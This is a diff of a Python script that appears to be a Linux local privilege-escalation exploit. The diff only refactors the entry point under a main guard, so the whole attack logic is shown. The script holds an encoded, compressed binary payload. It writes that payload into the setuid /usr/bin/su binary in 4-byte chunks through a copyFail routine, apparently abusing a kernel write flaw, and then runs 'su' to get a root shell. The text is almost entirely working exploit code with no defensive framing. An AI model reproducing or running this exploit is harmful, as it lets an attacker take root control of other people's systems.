@@ -2,7 +2,7 @@ import os
 import zlib
 import socket
 
-#Base64-encoded byte payload
+#B64-encoded byte payload
 PAYLOAD = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 
 ''' Function d() --> toBytes() '''
@@ -67,12 +67,15 @@ def copyFail(file, index, byteData):
     except:
         return 0
 
-file = os.open("/usr/bin/su", 0) #open readonly target su
-i = 0
-decomp = zlib.decompress(toBytes(PAYLOAD)) #decode and decompress payload
 
-while i<len(decomp):
-    copyFail(file, i, decomp[i:i+4]) #iterate through payload bytes
-    i += 4
+''' Main function to execute payload '''
+if __name__ == '__main__':
+    file = os.open("/usr/bin/su", 0) #open readonly target su
+    i = 0
+    decomp = zlib.decompress(toBytes(PAYLOAD)) #decode and decompress payload
 
-os.system("su") #call modified target file
+    while i<len(decomp):
+        copyFail(file, i, decomp[i:i+4]) #iterate through payload bytes
+        i += 4
+
+    os.system("su") #call modified target file
